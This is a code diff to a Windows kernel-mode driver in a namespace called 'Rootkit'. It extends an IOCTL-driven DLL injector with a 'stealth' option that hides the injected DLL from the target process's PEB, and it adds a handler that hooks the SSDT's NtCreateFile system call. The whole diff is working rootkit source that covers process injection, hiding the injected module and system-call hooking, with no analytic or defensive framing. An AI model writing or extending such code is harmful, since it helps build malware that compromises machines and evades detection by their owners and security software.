@@ -113,11 +113,14 @@ namespace Rootkit {
             */
         constexpr ULONG InjectDLL =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x708, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG TestFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x709, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
         WCHAR DLLName[256];
         WCHAR Path[MAX_PATH];
+        bool stealth;
     };
 
     NTSTATUS create(PDEVICE_OBJECT device_object, PIRP Irp) {
@@ -169,6 +172,8 @@ namespace Rootkit {
         HANDLE pid = request->process_id;
         WCHAR* DLLName = request->DLLName;
         WCHAR* Path = request->Path;
+        bool stealth = request->stealth;
+        int retval;
         switch (control_code) {
         case codes::HideDriver:
             DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
@@ -338,8 +343,15 @@ namespace Rootkit {
             */
         case codes::InjectDLL:
             char buf[256];
-            if (ProcessUtils::InjectDLL(Path, HandleToUlong(pid)) == STATUS_SUCCESS) {
+            retval = ProcessUtils::InjectDLL(Path, HandleToUlong(pid), stealth);
+            if (retval == STATUS_SUCCESS) {
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully.");
+                if (NT_SUCCESS(status)) {
+                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+                }
+            }
+            else if (retval == STATUS_SUCCESS_WITH_STEALTH) {
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully. -- STEALTH: DLL Has been hidden from PEB.");
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                 }
@@ -349,6 +361,14 @@ namespace Rootkit {
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                 }
+            }
+            break;
+        case codes::TestFile:
+            if (KernelUtils::HookSSDTFunction("NtCreateFile", FileUtils::HookedNtCreateFile) == STATUS_SUCCESS) {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] yo did it work");
+            }
+            else {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] whoopsie daisy");
             }
             break;
         default:
